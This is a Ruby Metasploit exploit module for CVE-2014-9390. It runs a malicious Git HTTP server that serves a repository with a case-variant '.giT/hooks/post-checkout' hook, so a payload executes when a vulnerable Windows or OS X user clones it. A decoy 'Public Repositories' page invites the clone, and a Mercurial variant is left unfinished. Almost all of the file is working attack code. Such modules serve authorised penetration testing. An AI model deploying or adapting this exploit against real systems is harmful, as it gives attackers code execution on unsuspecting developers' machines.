##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Malicious Git HTTP Server For CVE-2014-9390',
      'Description' => %q(
        This module exploits CVE-2014-9390, which affects Git versions less
        than 1.8.5.6, 1.9.5, 2.0.5, 2.1.4 and 2.2.1 on operating systems which
        have case-insensitive file systems like Windows and OS X.  Because the
        file system is case-insensitive, sensitive files in the .git directory
        can be overwritten by other files which live in a server-side .git
        directory which only differs in case (for example, .giT).  This results
        in all manner of potential consequences, including remote code
        execution.
      ),
      'License' => MSF_LICENSE,
      'Author' => [
        'Jon Hart <jon_hart[at]rapid7.com>' # metasploit module
      ],
      'References'     =>
        [
          ['CVE', '2014-9390'],
          ['URL', 'http://git-blame.blogspot.com.es/2014/12/git-1856-195-205-214-and-221-and.html'],
          ['URL', 'https://www.mehmetince.net/one-git-command-may-cause-you-hacked-cve-2014-9390-exploitation-for-shell/']
        ],
      'DisclosureDate' => 'Dec 18 2014',
      # TODO: correct all of this
      'Payload'        =>
        {
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic perl bash'
            },
          'EncoderType'     => Msf::Encoder::Type::Raw
        },
      'Platform'	=> %w(osx win),
      'Targets'	=>
        [
          [
            'Automatic',
            {
              'Platform' => [ 'unix' ],
              'Arch'     => ARCH_CMD
            }
          ]
        ],
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('GIT_URI', [false, 'The URI to use as the malicious Git instance (empty to disable)', '/git']),
        OptString.new('MERCURIAL_URI', [false, 'The URI to use as the malicious Mercurial instance (empty to disable)', '']),
        OptString.new('URIPATH', [true, 'The URI to display the malicious repositories in', '/'])
      ]
    )

    register_advanced_options(
      [
        OptString.new('GIT_HOOK', [false, 'The Git hook to use for exploitation', 'post-checkout']),
        OptString.new('MERCURIAL_HOOK', [false, 'The Mercurial hook to use for exploitation', 'update'])
      ]
    )
  end

  def setup
    @repo_data = {
      git: { files: {}, trigger: nil },
      mercurial: { files: {}, trigger: nil }
    }
    if git_uri.blank? && mercurial_uri.blank?
      fail ArgumentError, 'Must specify at least one non-blank GIT_URI or MERCURIAL_URI'
    end
    setup_git unless git_uri.blank?
    setup_mercurial unless mercurial_uri.blank?
  end

  def setup_git
    # URI must start with a /
    fail ArgumentError, 'GIT_URI must start with a /' unless git_uri =~ /^\//
    # sanity check the malicious hook:
    fail ArgumentError, 'GIT_HOOK must not be blank' if datastore['GIT_HOOK'].blank?

    # This builds a fake git repository using the knowledge from:
    # http://schacon.github.io/gitbook/7_how_git_stores_objects.html
    # http://schacon.github.io/gitbook/7_browsing_git_objects.html
    #
    # It creates a .giT/hooks/post-checkout file that contains a command to
    # execute.  Because the full path of this file will be considered identical
    # on case-insensitive filesystems and will be use in place of
    # .git/hooks/post-checkout and will subsequently execute commands of our
    # choosing upon cloning
    # build the hook file blob
    full_cmd = "#!/bin/sh\n#{payload.encoded}\n"
    sha1, content = build_object('blob', full_cmd)
    trigger = "/objects/#{get_path(sha1)}"
    @repo_data[:git][:trigger] = trigger
    @repo_data[:git][:files][trigger] = content
    # build tree that points to the blob
    sha1, content = build_object('tree', "100755 #{datastore['GIT_HOOK']}\0#{[sha1].pack('H*')}")
    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
    # build a tree that points to the hooks directory in which the hook lives, called hooks
    sha1, content = build_object('tree', "40000 hooks\0#{[sha1].pack('H*')}")
    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
    # build a tree that points to the partially uppercased .git directory in
    # which hooks live
    variants = []
    %w(g G). each do |g|
      %w(i I).each do |i|
        %w(t T).each do |t|
          git = g + i + t
          variants << git unless git.chars.none? { |c| c == c.upcase }
        end
      end
    end
    git_dir = '.' + variants.sample
    sha1, content = build_object('tree', "40000 #{git_dir}\0#{[sha1].pack('H*')}")
    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
    # build the supposed commit that dropped this file
    # a random user and user name
    user = rand_text_alphanumeric(3 + rand(10)) + ' ' + rand_text_alphanumeric(3 + rand(10))
    user_name = user.downcase.gsub(/\s+/, '_')
    # random company
    company = (rand_text_alphanumeric(3 + rand(10)) + '.' + %w(com net org).sample).downcase
    # random commit and author time stamps
    tstamp = Time.now.to_i
    author_time = rand(tstamp)
    commit_time = rand(author_time)
    tz_off = rand(10)
    commit = "author #{user} <#{user_name}@#{company}> #{author_time} -0#{tz_off}00\n" \
             "committer #{user} <#{user_name}@#{company}> #{commit_time} -0#{tz_off}00\n" \
             "\n" \
             "Initial commit to open git repository for #{company}!\n"
    if datastore['VERBOSE']
      vprint_status("Malicious Git commit of #{git_dir}/#{datastore['GIT_HOOK']} is:")
      commit.each_line { |l| vprint_status(l.strip) }
    end
    sha1, content = build_object('commit', "tree #{sha1}\n#{commit}")
    @repo_data[:git][:files]["/objects/#{get_path(sha1)}"] = content
    # build HEAD
    @repo_data[:git][:files]['/HEAD'] = "ref: refs/heads/master\n"
    # lastly, build refs
    @repo_data[:git][:files]['/info/refs'] = "#{sha1}\trefs/heads/master\n"
  end

  def setup_mercurial
    # URI must start with a /
    fail ArgumentError, 'MERCURIAL_URI must start with a /' unless mercurial_uri =~ /^\//
    # sanity check the malicious hook:
    fail ArgumentError, 'MERCURIAL_HOOK must not be blank' if datastore['MERCURIAL_HOOK'].blank?
    # we fake the Mercurial HTTP protocol such that we are compliant as possible but
    # also as simple as possible so that we don't have to support all of the protocol
    # complexities.  Taken from:
    #   http://mercurial.selenic.com/wiki/HttpCommandProtocol
    #   http://selenic.com/hg/file/tip/mercurial/wireproto.py
    @repo_data[:mercurial][:files]['?cmd=capabilities'] = 'heads getbundle=HG10UN'
    fake_sha1 = 'e6c39c507d7079cfff4963a01ea3a195b855d814'
    @repo_data[:mercurial][:files]['?cmd=heads'] = "#{fake_sha1}\n"
    # TODO: properly bundle this using the information in http://mercurial.selenic.com/wiki/BundleFormat
    @repo_data[:mercurial][:files]["?cmd=getbundle&common=0000000000000000000000000000000000000000&heads=#{fake_sha1}"] = Zlib::Deflate.deflate("HG10UNfoofoofoo")

    # TODO: finish building the fake repository
  end

  def build_object(type, content)
    header = "#{type} #{content.size}\0"
    store = header + content
    [Digest::SHA1.hexdigest(store), Zlib::Deflate.deflate(store)]
  end

  def get_path(sha1)
    sha1[0...2] + '/' + sha1[2..40]
  end

  def exploit
    super
  end

  def primer
    # add the git and mercurial URIs as necessary
    hardcoded_uripath(git_uri) unless git_uri.blank?
    hardcoded_uripath(mercurial_uri) unless mercurial_uri.blank?
  end

  def on_request_uri(cli, req)
    # if the URI is one of our repositories and the user-agent is that of git/mercurial
    # send back the appropriate data, otherwise just show the HTML version
    if (user_agent = req.headers['User-Agent'])
      if user_agent =~ /^git\// && req.uri.start_with?(git_uri) && !git_uri.blank?
        do_git(cli, req)
        return
      elsif user_agent =~ /^mercurial\// && req.uri.start_with?(mercurial_uri) && !mercurial_uri.blank?
        do_mercurial(cli, req)
        return
      end
    end

    do_html(cli, req)
  end

  def do_git(cli, req)
    # determine if the requested file is something we know how to serve from our
    # fake repository and send it if so
    req_file = URI.parse(req.uri).path.gsub(/^#{git_uri}/, '')
    if @repo_data[:git][:files].key?(req_file)
      vprint_status("Sending Git #{req_file}")
      send_response(cli, @repo_data[:git][:files][req_file])
      if req_file == @repo_data[:git][:trigger]
        vprint_status("Trigger!")
        # Do we need this?  If so, how can I update the payload which is in a file which
        # has already been built?
        # regenerate_payload
        handler(cli)
      end
    else
      vprint_status("Git #{req_file} doesn't exist")
      send_not_found(cli)
    end
  end

  def do_html(cli, _req)
    resp = create_response
    resp.body = <<HTML
     <html>
      <head><title>Public Repositories</title></head>
      <body>
        <p>Here are our public repositories:</p>
        <ul>
HTML

    if git_uri.blank?
      resp.body << "<li><a>Git</a> (currently offline)</li>"
    else
      this_git_uri = URI.parse(get_uri).merge(git_uri)
      resp.body << "<li><a href=#{git_uri}>Git</a> (clone with `git clone #{this_git_uri}`)</li>"
    end

    if mercurial_uri.blank?
      resp.body << "<li><a>Mercurial</a> (currently offline)</li>"
    else
      this_mercurial_uri = URI.parse(get_uri).merge(mercurial_uri)
      resp.body << "<li><a href=#{mercurial_uri}>Mercurial</a> (clone with `hg clone #{this_mercurial_uri}`)</li>"
    end
    resp.body << <<HTML
        </ul>
      </body>
    </html>
HTML

    cli.send_response(resp)
  end

  def do_mercurial(cli, req)
    # determine if the requested file is something we know how to serve from our
    # fake repository and send it if so
    uri = URI.parse(req.uri)
    req_path = uri.path
    req_path += "?#{uri.query}" if uri.query
    req_path.gsub!(/^#{mercurial_uri}/, '')
    if @repo_data[:mercurial][:files].key?(req_path)
      vprint_status("Sending Mercurial #{req_path}")
      send_response(cli, @repo_data[:mercurial][:files][req_path], 'Content-Type' => 'application/mercurial-0.1')
      if req_path == @repo_data[:mercurial][:trigger]
        vprint_status("Trigger!")
        # Do we need this?  If so, how can I update the payload which is in a file which
        # has already been built?
        # regenerate_payload
        handler(cli)
      end
    else
      vprint_status("Mercurial #{req_path} doesn't exist")
      send_not_found(cli)
    end
  end

  def git_uri
    datastore['GIT_URI']
  end

  def mercurial_uri
    datastore['MERCURIAL_URI']
  end
end
